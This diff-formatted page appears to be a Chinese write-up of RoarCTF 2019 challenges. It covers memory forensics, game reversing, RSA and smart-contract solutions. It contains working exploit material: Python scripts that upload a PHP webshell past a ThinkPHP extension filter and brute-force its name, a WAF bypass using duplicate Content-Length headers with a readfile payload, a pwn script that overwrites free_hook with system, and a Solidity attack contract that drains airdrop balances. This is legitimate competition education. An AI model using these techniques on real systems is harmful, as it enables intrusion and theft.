@@ -1,0 +1,904 @@
+**作者：楼上请让路战队**  
+**时间：2019年10月22日**
+
+#### 黄金6年
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723538000-11.png-w331s)
+
+文件尾部有一段base64，解码为16进制可以看到是一个压缩包
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723538000-12.png-w331s)
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723538000-13.png-w331s)
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723538000-14.png-w331s)
+
+使用pr抽帧
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723538000-15.png-w331s)
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723538000-16.png-w331s)
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723538000-17.png-w331s)
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723538000-18.png-w331s)
+
+可以看到部分帧中有二维码，依次扫码即可得到key iwantplayctf
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723539000-45.png-w331s)
+
+#### forensic
+
+直接上volatility
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723539000-19.png-w331s)
+
+建议profile，直接用Win7SP1x86就可以。
+
+查看进程
+
+volatility -f mem.raw pslist --profile=Win7SP1x86
+
+可以看到存在以下几个值得注意的进程：
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723539000-20.png-w331s)
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723539000-21.png-w331s)
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723539000-22.png-w331s)
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723539000-23.png-w331s)
+
+Dumpit.exe 一款内存镜像提取工具。
+
+TrueCrypt.exe 一款磁盘加密工具。
+
+Notepad.exe windows自带的记事本。
+
+Mspaint,exe windows自带画图工具。
+
+通过查看userassist可以发现notepad mspaint
+在提取内存时在内存中并没有数据。查看用户Home目录的文件，可以发现有一个用户保存的图片文件
+
+`volatility -f mem.raw --profile=Win7SP1x86 filescan|grep -v Temporary |grep
+-v .dll|grep -E 'png|jpg|gif|zip|rar|7z|pdf'`
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723539000-24.png-w331s)
+
+把图片dump下来
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723539000-25.png-w331s)
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723539000-26.png-w331s)
+
+通过查看桌面文件还可以发现dumpit.exe在桌面上，而dumpit.exe默认生成的文件是
+{hash}.raw，默认保存路径是dumpit.exe所在的路径。
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723539000-27.png-w331s)
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723539000-28.png-w331s)
+
+尝试dump
+位于0x000000001fca1130位置的raw镜像，发现该文件还没有数据，因此判断取证的时候dumpit.exe还在运行中，dump下来dumpit.exe的内存镜像。
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723539000-29.png-w331s)
+
+对dumpit.exe的内存镜像进行分析
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723539000-30.png-w331s)
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723539000-31.png-w331s)
+
+猜测密码就是刚那张图片上的扭曲文字
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723539000-32.png-w331s)
+
+不得不说，有几个位置很难辨认，比如第一个字符是数字1还是字母l还是字母I,那些大小写长得一样的是大写还是小写，中间那个是y还是g。直接上掩码爆破
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723539000-33.png-w331s)
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723540000-34.png-w331s)
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723540000-35.png-w331s)
+
+#### TankGame
+
+用dnspy反编译，关键代码：
+
+    
+    
+    public static void WinGame()
+       {
+           if (!winGame && ((nDestroyNum == 4) || (nDestroyNum == 5)))
+           {
+               string str = "clearlove9";
+               for (int i = 0; i < 0x15; i++)
+               {
+                   for (int j = 0; j < 0x11; j++)
+                   {
+                       str = str + MapState[i, j].ToString();
+                   }
+               }
+               if (Sha1(str) == "3F649F708AAFA7A0A94138DC3022F6EA611E8D01")
+               {
+                   FlagText._instance.gameObject.SetActive(true);
+                   FlagText.str = "RoarCTF{wm-" + Md5(str) + "}";
+                   winGame = true;
+               }
+           }
+       }
+    
+       public static string Md5(string str)
+       {
+           byte[] bytes = Encoding.UTF8.GetBytes(str);
+           byte[] buffer2 = MD5.Create().ComputeHash(bytes);
+           StringBuilder builder = new StringBuilder();
+           foreach (byte num in buffer2)
+           {
+               builder.Append(num.ToString("X2"));
+           }
+           return builder.ToString().Substring(0, 10);
+       }
+    
+       private void OnTriggerEnter2D(Collider2D collision)
+       {
+           int x = (int) collision.gameObject.transform.position.x;
+           int y = (int) collision.gameObject.transform.position.y;
+           switch (collision.tag)
+           {
+               case "Tank":
+                   if (!this.isPlayerBullect)
+                   {
+                       collision.SendMessage("Die");
+                       UnityEngine.Object.Destroy(base.gameObject);
+                   }
+                   break;
+               case "Heart":
+                   MapManager.MapState[x + 10, y + 8] = 9;
+                   MapManager.nDestroyNum++;
+                   collision.SendMessage("Die");
+                   UnityEngine.Object.Destroy(base.gameObject);
+                   break;
+    
+               case "Enemy":
+                   if (this.isPlayerBullect)
+                   {
+                       collision.SendMessage("Die");
+                       UnityEngine.Object.Destroy(base.gameObject);
+                   }
+                   break;
+               case "Wall":
+                   MapManager.MapState[x + 10, y + 8] = 8;
+                   MapManager.nDestroyNum++;
+                   UnityEngine.Object.Destroy(collision.gameObject);
+                   UnityEngine.Object.Destroy(base.gameObject);
+                   break;
+    
+               case "Barrier":
+                   if (this.isPlayerBullect)
+                   {
+                       collision.SendMessage("PlayAudio");
+                   }
+                   UnityEngine.Object.Destroy(base.gameObject);
+                   break;
+           }
+       }
+
+墙1替换成8，老家0替换成9，66个变量，4或5个位置需要变，首先爆破66 * 65 * 64 *
+63，爆破出来了，计算md5得到前10字节，得到flag，细节如图：
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723540000-36.png-w331s)
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723540000-37.png-w331s)
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723540000-38.png-w331s)
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723540000-39.png-w331s)
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723541000-40.png-w331s)
+
+#### simple_upload
+
+    
+    
+     <?php
+    namespace Home\Controller;
+    
+    use Think\Controller;
+    
+    class IndexController extends Controller
+    {
+        public function index()
+        {
+            show_source(__FILE__);
+        }
+        public function upload()
+        {
+            $uploadFile = $_FILES['file'] ;
+    
+            if (strstr(strtolower($uploadFile['name']), ".php") ) {
+                return false;
+            }
+    
+            $upload = new \Think\Upload();// 实例化上传类
+            $upload->maxSize  = 4096 ;// 设置附件上传大小
+            $upload->allowExts  = array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型
+            $upload->rootPath = './Public/Uploads/';// 设置附件上传目录
+            $upload->savePath = '';// 设置附件上传子目录
+            $info = $upload->upload() ;
+            if(!$info) {// 上传错误提示错误信息
+              $this->error($upload->getError());
+              return;
+            }else{// 上传成功 获取上传文件信息
+              $url = __ROOT__.substr($upload->rootPath,1).$info['file']['savepath'].$info['file']['savename'] ;
+              echo json_encode(array("url"=>$url,"success"=>1));
+            }
+        }
+    } 
+
+ThinkPHP默认上传文件名是递增的。代码中ThinkPHP的后缀过滤无效，所以通过上传多个文件的方式，绕过.php后缀的判断，文件名，需要爆破
+
+写脚本上传一个正常文件，再上传多个文件，再上传一个正常文件。然后获取到第一三次上传的文件名
+
+    
+    
+    import requests
+    
+    url = "http://lo408dybroarctf.4hou.com.cn:34422/index.php/Home/Index/upload"
+    
+    files1 = {'file': open('test.txt','r')}
+    files2 = {'file[]': open('test.php','r')}
+    
+    r = requests.post(url,files=files1)
+    print(r.text)
+    
+    r = requests.post(url,files=files2)
+    print(r.text)
+    
+    r = requests.post(url,files=files1)
+    print(r.text)
+
+爆破一下第一三文件名之间的所有文件名
+
+    
+    
+    import requests
+    
+    #{"url":"\/Public\/Uploads\/2019-10-12\/5da1b52bb3645.txt","success":1}
+    #{"url":"\/Public\/Uploads\/","success":1}
+    #{"url":"\/Public\/Uploads\/2019-10-12\/5da1b52bd6f0a.txt","success":1}
+    
+    
+    s = "1234567890abcdef"
+    for i in s:
+        for j in s:
+            for k in s:
+                for l in s:
+                    url = "http://lo408dybroarctf.4hou.com.cn:34422/Public/Uploads/2019-10-12/5da1b52bc%s%s%s%s.php"%(i,j,k,l)
+                    r = requests.get(url)
+    #               print(url)
+                    if r.status_code != 404:
+                        print(url)
+                        break
+
+爆破到文件名后，即可访问上传的木马，拿到flag
+
+#### easy_calc
+
+这题首先进去发现是一个计算器的题目。
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723543000-7.png-w331s)
+
+这道题是国赛的 **love_math** 的修改版，除去了长度限制，payload中不能包含' ', '\t', '\r', '\n',''', '"',
+'`', '[', ']'
+等字符，不同的是网站加了waf，需要绕过waf。首先需要绕过waf，测试发现当我们提交一些字符时，会直接403，可以构造畸形的HTTP包来绕过，经测试使用两个
+"Content-Length" 就可以了。
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723543000-10.png-w331s)
+
+因为禁掉了一些字符，所以导致我们不能直接getflag，继续分析payload构造
+
+这里用到几个php几个数学函数。
+
+我们首先要构造列目录的payload，肯定要使用`scandir`函数，尝试构造列举根目录下的文件。`scandir`可以用`base_convert`函数构造，但是利用`base_convert`只能解决`a~z`的利用，因为根目录需要`/`符号，且不在`a~z`,所以需要`hex2bin(dechex(47))`这种构造方式，`dechex()`
+函数把十进制数转换为十六进制数。`hex2bin()` 函数把十六进制值的字符串转换为 ASCII 字符。
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723543000-6.png-w331s)
+
+构造读取flag，使用`readfile`函数，paload：`base_convert(2146934604002,10,36)(hex2bin(dechex(47)).base_convert(25254448,10,36))`，方法类似
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723543000-3.png-w331s)
+
+#### easy_java
+
+这道进去首先想到的就是任意文件下载，但是刚开始用`GET`方式一直什么都下载不了，连网站确定目录的图片都下不了。后来修改为post，可以了。。。
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723544000-4.png-w331s)
+
+尝试读取`WEB-INF/web.xml`发现操作flag的关键文件位置
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723544000-5.png-w331s)
+
+将图中base64解码即flag。
+
+#### ez_op
+
+payload:
+
+    
+    
+    #!/usr/bin/env python3
+    # -*- coding=utf-8 -*-    
+    from pwn import *
+    
+    system_addr = 0x08051C60
+    hook_free = 0x080E09F0
+    
+    # opcdoe
+    opcode = ""
+    
+    # get stack_addr
+    opcode += """\
+    push 5
+    stack_load\
+    """
+    
+    # sub hook_free
+    opcode += f"""\
+    push {hook_free}
+    sub\ 
+    """
+    
+    # value / 4 + 1
+    opcode += """\
+    push 4
+    div
+    push 1
+    add\
+    """
+    
+    # *hook_free = system_addr
+    opcode += f"""\
+    push {system_addr}
+    stack_set\
+    """
+    opcode = f"""\
+    push {0x6e69622f}
+    push {0x68732f}
+    push {system_addr}
+    push 1
+    push 4
+    push 64
+    stack_load
+    push {hook_free}
+    sub
+    div
+    sub
+    stack_set\
+    """
+    OPCODET = {
+      "push": 0x2a3d,
+      "add": 0,
+      "sub": 0x11111,
+      "div": 0x514,
+      "stack_set": 0x10101010,
+      "stack_load": -1
+    }
+    opcode_list = opcode.split("\n")
+    op_result = []
+    num_result = []
+    for op in opcode_list:
+      tmp = op.split(" ")
+      assert tmp[0] in OPCODET
+      op_result.append(str(OPCODET[tmp[0]]))
+      if len(tmp) == 2:
+          num_result.append(str(tmp[1]))
+    
+    result_op = " ".join(op_result)
+    result_num = " ".join(num_result)
+    
+    print(result_op)
+    print(result_num)
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723544000-41.png-w331s)
+
+#### polyre
+
+使用 deflat.py 脱去控制流平坦化，加密算法大致是：输入 48，平分 6 组，将每组 8 字节转化为 long
+类型的值，对每组进行加密，先判断正负，然后将值乘 2，随后根据正负异或 0xB0004B7679FA26B3，循环 64
+次，最后进行比较；按照这个逻辑写逆运算就可以了，逆运算见 depoly.py
+
+    
+    
+    origin = [0xbc8ff26d43536296,
+              0x520100780530ee16,
+              0x4dc0b5ea935f08ec,
+              0x342b90afd853f450,
+              0x8b250ebcaa2c3681,
+              0x55759f81a2c68ae4]
+    key = 0xB0004B7679FA26B3
+    data = ""
+    
+    for value in origin:
+        for i in range(0, 64):
+            tail = value & 1
+            if tail == 1:
+                value = value ^ key
+            value = value // 2
+            if tail == 1:
+                value = value | 0x8000000000000000
+            #print(hex(value))
+        # end for
+        print(hex(value))
+        j = 0
+        while (j < 8):
+            data += chr(value & 0xFF)
+            value = value >> 8
+            j += 1
+        # end while
+    #end for
+    print(data)
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723545000-42.png-w331s)
+
+#### rsa
+
+根据题目文件可知：
+
+A=(((y%x) **5)%(x%y))** 2019+y**316+(y+1)/x
+
+p=next_prime(z _x_ y)
+
+q=next_prime(z)
+
+n=p*q
+
+直接爆破A方程可得 x*y=166。（一个是2一个是83，懒得重新写脚本了很好爆。）
+
+然后可得
+
+    
+    
+    p=next_prime(z*166)
+    
+    q=next_prime(z)
+
+可以推断出，n和z _z_
+166的值相对来说是距离比较近的，根据next_prime可以推测出sqrt(n/166)的值和p和q的其中一个是很接近的，爆破即可。
+
+py2 ：
+
+    
+    
+    import sympy
+    
+    import gmpy2
+    
+    n=117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127
+
+m是n/166的开放根，和p q 中的一个距离很近
+
+    
+    
+    m=sympy.nextprime(842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458029)
+    
+    m2=842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458029*166
+    
+    k=m
+    
+    p=0
+    
+    q=0
+    
+    while (m>10000):
+    
+        if(n%m==0):
+    
+            \#print (m) A=(((y%x)**5)%(x%y))**2019+y**316+(y+1)/x
+
+根据方程可以直接算出x和y
+
+    
+    
+    a=2683349182678714524247469512793476009861014781004924905484127480308161377768192868061561886577048646432382128960881487463427414176114486885830693959404989743229103516924432512724195654425703453612710310587164417035878308390676612592848750287387318129424195208623440294647817367740878211949147526287091298307480502897462279102572556822231669438279317474828479089719046386411971105448723910594710418093977044179949800373224354729179833393219827789389078869290217569511230868967647963089430594258815146362187250855166897553056073744582946148472068334167445499314471518357535261186318756327890016183228412253724
+    
+    x=1
+    
+    y=1
+    
+    n=0
+    
+    c=0
+    
+    d=0
+    
+    for x in range(1,100):
+    
+       for y in range(2,100):
+    
+           c=(y+1)/x
+    
+           d=x%y
+    
+           if(d!=0):
+    
+               n=(((y%x)**5)%d)**2019+y**316+c
+    
+           if(n==a):
+    
+                print (x)
+    
+                print (y)
+    
+    可得x=2 y=83
+    
+    p=next_prime(z*x*y)
+    
+    q=next_prime(z)
+    
+    n=q*p
+
+因此可以猜测n和（z _x_ y） _z的值也是很接近的，也就是n和z^2_
+166是很接近的，那么sqrt(n/166)和q是很接近的。所以从sqrt(n/166)附近查找prime。
+
+e是未知的，但是e的取值范围相对是小的，直接猜或者爆破，结果可知e为65537.
+
+解密脚本
+
+    
+    
+    import sympy
+    
+    import math
+    
+    import binascii
+    
+    from Crypto.Util.number import long_to_bytes
+    
+    n=117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127
+
+m即是sqrt(n/166)的近似值
+
+    
+    
+    m=sympy.nextprime(842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458029)
+    
+    c=86974685960185109994565885227776590430584975317324687072143606337834618757975096133503732246558545817823508491829181296701578862445122140544748432956862934052663959903364809344666885925501943806009045214347928716791730159539675944914294533623047609564608561054087106518420308176681346465904692545308790901579479104745664756811301111441543090132246542129700485721093162972711529510721321996972649182594310700996042178757282311887765329548031672904349916667094862779984235732091664623511790424370705655016549911752412395937963400908229932716593592702387850259325784109798223415344586624970470351548381110529919234353
+    
+    p=0
+    
+    q=0
+    
+    \#从m附近查找q或p
+    
+    while(m>100):
+    
+        if(n%m==0):
+    
+            p=m
+    
+            print "p="
+    
+            print p
+    
+            q=n/p
+    
+            print "q=" 
+    
+            print q
+    
+            break
+    
+        m=sympy.nextprime(m)
+    
+    def egcd(a,b):
+    
+        if a==0:
+    
+            return (b,0,1)
+    
+        else:
+    
+            g,y,x=egcd(b%a,a)
+    
+            return (g,x-(b//a)*y,y)
+    
+    def modinv(a,m):
+    
+        g,x,y=egcd(a,m)
+    
+        if g!=1:
+    
+            raise Exception(" error")
+    
+        else:
+    
+            return x%m
+    
+    e=1
+    
+    d=0
+
+爆破e
+
+    
+    
+    while(e<100000):
+    
+        \#try:
+    
+        \#e=sympy.nextprime(e)
+    
+        e=65537 #最后爆破成功的e
+    
+        d=modinv(e,(p-1)*(q-1))
+    
+        m=pow(c,d,n)
+    
+        print long_to_bytes(m)
+    
+        m_hex = hex(m)[2:]
+    
+       \# try:    
+    
+        print m_hex
+    
+        print("ascii:\n%s"%(binascii.a2b_hex(m_hex).decode("utf8"),))
+    
+       \# except:
+    
+       \#   if(e%10000==0):
+    
+       \#       print e
+
+#### babyrsa
+
+一个数学结论：对于一个素数p来说，（p-1）的阶乘加上（p-2）的阶乘等于p乘以（p-2）的阶乘,能被p整除,（p-1）的阶乘除以p余p-1（因为p的阶乘能被p整除）
+
+就是
+
+    
+    
+    (p-1)!+(p-2)!=p*(p-2)!  
+    (p-1)!=p*(p-1)
+    (p-2)! % p=1
+
+解密脚本如下：
+
+    
+    
+    import sympy
+    from Crypto.Util.number import long_to_bytes
+    def egcd(a,b):
+        if a==0:
+            return (b,0,1)
+        else:
+            g,y,x=egcd(b%a,a)
+            return (g,x-(b//a)*y,y)
+    def modinv(a,m):
+        g,x,y=egcd(a,m)
+        if g!=1:
+            raise Exception(" error")
+        else:
+            return x%m
+    a1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407
+    b1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596
+    a2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927
+    b2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026
+    n=85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733
+    c=75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428
+    p=1
+    q=1
+    i=1
+    l=0
+    for i in range(b1+1,a1-1):
+        p *= modinv(i,a1)
+        p %=a1
+    p=sympy.nextprime(p)
+    print "p="
+    print p
+    for i in range(b2+1,a2-1):
+        q *=modinv(i,a2)
+        q %=a2
+    q=sympy.nextprime(q)
+    print "q="
+    print q
+    r=n/q/p
+    print "r="
+    print r
+    fn=(p-1)*(q-1)*(r-1)
+    print "fn="
+    print fn
+    e=4097
+    d=modinv(e,fn)
+    print "d="
+    print d
+    m=pow(c,d,n)
+    print "m="
+    print m
+    print long_to_bytes(m)
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723545000-43.png-w331s)
+
+#### 区块链1
+
+做题的时候发现已经有人做出来了，然后去看做出来人的交易记录，发现是薅羊毛，通过逆向做出来人的记录，照抄了一个，payload合约如下：
+
+    
+    
+    /**
+     *Submitted for verification at Etherscan.io on 2019-10-08
+     */
+    
+     pragma solidity ^0.4.24;
+    
+     contract P_Bank
+     {
+       mapping (address => uint) public balances;
+    
+       uint public MinDeposit = 0.1 ether;
+    
+       Log TransferLog;
+       event FLAG(string b64email, string slogan);
+       constructor(address _log) public { 
+           TransferLog = Log(_log);
+         }
+       function Ap() public {
+           if(balances[msg.sender] == 0) {
+               balances[msg.sender]+=1 ether;
+           }
+       }
+       function Transfer(address to, uint val) public {
+           if(val > balances[msg.sender]) {
+               revert();
+           }
+           balances[to]+=val;
+           balances[msg.sender]-=val;
+       }
+       function CaptureTheFlag(string b64email) public returns(bool){
+         require (balances[msg.sender] > 500 ether);
+         emit FLAG(b64email, "Congratulations to capture the flag!");
+       }
+       function Deposit()
+       public
+       payable
+       {
+           if(msg.value > MinDeposit)
+           {
+               balances[msg.sender]+= msg.value;
+               TransferLog.AddMessage(msg.sender,msg.value,"Deposit");
+           }
+       }
+    
+       function CashOut(uint _am) public 
+       {
+           if(_am<=balances[msg.sender])
+           {
+    
+               if(msg.sender.call.value(_am)())
+               {
+                   balances[msg.sender]-=_am;
+                   TransferLog.AddMessage(msg.sender,_am,"CashOut");
+               }
+           }
+       }
+    
+       function() public payable{}    
+    
+     }
+    
+     contract Log 
+     {
+    
+       struct Message
+       {
+           address Sender;
+           string Data;
+           uint Val;
+           uint Time;
+       }
+       string err = "CashOut";
+       Message[] public History;
+       Message LastMsg;
+       function AddMessage(address _adr,uint _val,string _data)
+       public
+       {
+           LastMsg.Sender = _adr;
+           LastMsg.Time = now;
+           LastMsg.Val = _val;
+           LastMsg.Data = _data;
+           History.push(LastMsg);
+       }
+     }
+     contract FatherOwned {
+       address owner;
+       modifier onlyOwner{ if (msg.sender != owner) revert(); _; }
+     }
+     contract Attack
+     {
+       address owner;
+       P_Bank target;
+       constructor(address my) public { 
+           owner = my;
+           target = P_Bank(0xF60ADeF7812214eBC746309ccb590A5dBd70fc21);
+           target.Ap();
+           target.Transfer(owner, 1 ether);
+           selfdestruct(owner);
+         }
+     }
+     contract Deploy is FatherOwned
+     {
+       constructor() public { 
+           owner = msg.sender;
+         }
+         function getflag() public onlyOwner {
+             P_Bank target;
+             target = P_Bank(0xF60ADeF7812214eBC746309ccb590A5dBd70fc21);
+             target.CaptureTheFlag("baiyjrh@gmail.com");
+         }
+         function ffhhhhhhtest1() public onlyOwner {
+         uint i;
+         for (i=0; i<10; i++){
+             new Attack(owner);
+         }
+         }
+         function ffhhhhhhtest2() public onlyOwner {
+         uint i;
+         for (i=0; i<30; i++){
+             new Attack(owner);
+    
+         }
+       }
+         function ffhhhhhhtest3() public onlyOwner {
+         uint i;
+         for (i=0; i<50; i++){
+             new Attack(owner);
+         }
+       }
+       function ffhhhhhhtest4() public onlyOwner {
+         uint i;
+         for (i=0; i<70; i++){
+             new Attack(owner);
+    
+         }
+       }
+     }
+
+#### 智能合约2
+
+给的源码和实际的不一样，同样了看了下之前做出来的人的交易，发现了一个函数：0x5ad0ae39
+
+逆向一下得到大概代码：
+
+    
+    
+    func 0x5ad0ae39(address1, address2, uint, address3)
+       require(allowance[address1][msg.sender] >= uint)
+       require(address3 == msg.sender + 0x32c3edb)
+       balanceOf[address1] -= _value;
+       balanceOf[address2] += _value;
+       allowance[address1][msg.sender] -= _value;
+
+然后在标准token的sol里面有一个函数：
+
+    
+    
+    function approve(address _spender, uint256 _value) public returns (bool) {
+       allowed[msg.sender][_spender] = _value;
+       Approval(msg.sender, _spender, _value);
+       return true;
+     }
+
+通过approve函数给allowance[msg.sender][msg.sender]赋值，随便大于1000的值就行。
+
+然后调用0x5ad0ae39，这里就比较蛋疼了，因为爆破不出这个函数名，没法直接用remix做题，没办法只能写代码了。
+
+过程如图：
+
+![](https://images.seebug.org/content/images/2019/10/22/1571723545000-44.png-w331s)
+
+* * *
+
+![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
+本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1059/>
+
